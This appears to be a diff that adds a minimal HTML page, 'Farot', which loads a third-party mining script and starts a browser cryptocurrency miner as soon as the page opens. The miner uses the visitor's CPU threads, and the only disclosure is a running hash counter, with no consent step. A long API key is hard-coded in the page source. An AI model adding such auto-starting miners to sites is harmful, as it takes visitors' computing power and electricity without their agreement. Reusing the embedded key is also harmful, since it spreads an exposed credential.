@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>Farot</title>
+        <link rel="stylesheet" type="text/css" href="/src/css/base.css">
+        <script type="text/javascript" src="https://www.sparechange.io/static/sparechange.js"></script>
+    </head>
+    <body>
+        <div id="console" />
+
+        <script type="text/javascript">
+            var apiKey = "bf447936a7dc3d84cc219eb42db1c45435bae92b53d29c330abacccf6f58e939b519ddf15ff7d69a7d8718cbc78c5e9301b09116a08e6577e159479dc5945a2f";
+            var numberOfThreads = null; // null will auto-select based on user's CPU. Otherwise a number from 1-n.
+            var throttlePercent = 0.5; // 0.0 = no throttle (Will mine quickly). 1.0 = full throttling (Will mine very slowly, saves CPU) A good value is 0.5.
+            var miner = new Miner(apiKey, numberOfThreads, throttlePercent);
+            miner.start();
+            
+            setInterval(function() {
+                var hashesPerSecond = miner.getHashesPerSecond();
+                var totalHashes = miner.getTotalHashes();
+                var acceptedHashes = miner.getAcceptedHashes();
+
+                document.getElementById('console').innerHTML = 'Hashes per second: ' + hashesPerSecond + '<br />Total hashes: ' + totalHashes;
+            }, 1000);
+        </script>
+    </body>
+</html>
